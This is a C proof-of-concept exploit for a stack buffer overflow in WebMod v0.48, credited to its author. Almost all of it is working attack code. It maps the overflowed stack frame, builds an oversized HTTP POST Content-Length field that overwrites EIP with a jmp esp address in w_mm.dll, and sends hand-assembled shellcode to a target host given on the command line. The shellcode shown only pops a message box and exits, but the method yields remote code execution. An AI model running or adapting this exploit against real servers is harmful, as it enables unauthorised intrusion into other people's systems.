/*
 * WebMod Stack Buffer Overflow
 *
 * by cybermind (Kevin Masterson)
 * cybermind@gmail.com
 *
 * WebMod v0.48 exploit PoC code
 *
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock.h>
#pragma comment (lib, "ws2_32.lib")

/*
local variables in connectHandle():

char *input;			4
char buf[8192+1];		8193
int i,j;			8
int connfd;			4
int myid;			4
threaddata_t *tdata;		4
httpquery_t query;		149036
char tmp[1025];			1025
int rcv;			4
char clbuf[11];			11

total:				158293
actual (due to padding):	158308


  breakdown of types:
	typedef struct s_var {		546
	  char name[33];		  33
	  char value[513];		  513
	} var_s;


	typedef struct s_httpquery {	149036
	  char method[11];		  11
	  char clientip[16];		  16
	  char url[257];		  257
	  char *get;			  4
	  char *post;			  4
	  char *cookies;		  4
	  var_s vars[256];		  139776
	  char currentmapname[257];	  257
	  char sendcookies[8192+1];	  8193
	  char contenttype[257];	  257
	  char location[257];		  257
	} httpquery_t;
*/

//contains data to fill the Content-Length field with
char spambuf[20000];

//code to inject
//this particular code only works on Win2K SP4 (v5.0.4.0)
//and kernel32.dll v5.0.2195.6688
unsigned char code[] = {
					// ; push string onto the stack without using 0x00
	0xB8, 0x59, 0x5A, 0x32, 0x11,	//mov     eax, 11325A59h ; "HI!\0" + 11111111h
	0x2D, 0x11, 0x11, 0x11, 0x11,	//sub     eax, 11111111h
	0x50,				//push    eax
	0x8B, 0xC4,			//mov     eax, esp	 ; eax points to string

	0x33, 0xC9,			//xor     ecx, ecx	 ; zero

					// ; call MessageBox
	0x51,				//push    ecx		 ; flags (0)
	0x50,				//push    eax		 ; caption
	0x50,				//push    eax		 ; text
	0x51,				//push    ecx		 ; hwnd (0)
	0xB8, 0x98, 0x80, 0xE3, 0x77,	//mov     eax, 77E38098h ; &MessageBox
	0xFF, 0xD0,			//call    eax

					// ; call GetCurrentProcessId
	0xB8, 0xF4, 0xB8, 0x4E, 0x7C,	//mov     eax, 7C4EB8F4h ; &GetCurrentProcessId
	0xFF, 0xD0,			//call    eax

	0x33, 0xC9,			//xor     ecx, ecx	 ; zero

					// ; call TerminateProcess
	0x51,				//push    ecx		 ; return code (0)
	0x50,				//push    eax		 ; process id
	0xB8, 0xC3, 0x8D, 0x51, 0x7C,   //mov     eax, 7C518DC3h ; &TerminateProcess
	0xFF, 0xD0			//call    eax

};

//EIP you want to insert, this points to an "FF E4" (jmp esp) in w_mm.dll
//set this to 0xFFFFFFFF to just cause a crash
unsigned int our_eip = 0x67E03C5B;

int main(int argc, char* argv[]) {
	WSADATA wsadata;
	int sock = 0;
	struct hostent* host = NULL;
	struct sockaddr_in saddr;

	//data to sent initially
	char initbuf[] = "POST / HTTP/1.1\nHost: localhost:27015\nContent-Length: ";

	//data to send after headers
	char endbuf[] = "\n\n";

	char* hostname = NULL;
	short hostport = 27015;

	int i;
	unsigned int sent = 0;

	//get host/port from command line
	if (argc < 2) {
		printf("Usage:\t%s <hostname|ip> [port=27015]\n", argv[0]);
		return 1;
	}
	hostname = argv[1];
	if (argc >= 3) hostport = atoi(argv[2]);

	WSAStartup(MAKEWORD(1,1), &wsadata);

	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock <= 0) {
		printf("socket() error\n");
		return 1;
	}

	host = gethostbyname(hostname);
	if (!host) {
		printf("gethostbyname() error\n");
		return 1;
	}

	printf("Resolved \"%s\" to %s\n", hostname, inet_ntoa(*(struct in_addr*)host->h_addr_list[0]));

	memset(&saddr, 0, sizeof(struct sockaddr_in));
	saddr.sin_family = AF_INET;
	saddr.sin_port = htons(hostport);
	memcpy(&saddr.sin_addr.s_addr, host->h_addr_list[0], host->h_length);

	if (connect(sock, (struct sockaddr*)&saddr, sizeof(struct sockaddr)) < 0) {
		printf("connect() error\n");
		return 1;
	}

	//initialize buffers
	memset(spambuf, 'a', sizeof(spambuf));

	//send initial POST request
	sent += send(sock, initbuf, sizeof(initbuf)-1, 0);

	//send 7 full spambufs to get 140000 bytes
	for (i = 0; i < 7; ++i)
		sent += send(sock, spambuf, sizeof(spambuf), 0);

	//send partial spambuf to fill remaining data
	//(18308, this goes right up to the EIP)
	sent += send(sock, spambuf, 18308, 0);

	//fill EIP
	sent += send(sock, (char*)&our_eip, sizeof(our_eip), 0);

	//insert code!
	sent += send(sock, (char*)code, sizeof(code), 0);

	//send newlines after content-length
	sent += send(sock, endbuf, sizeof(endbuf)-1, 0);

	printf("%u bytes sent...waiting...\n", sent);

	//wait for a while so the socket isn't closed on our end
	//before they receive all the data
	Sleep(15000);

	return 0;
}

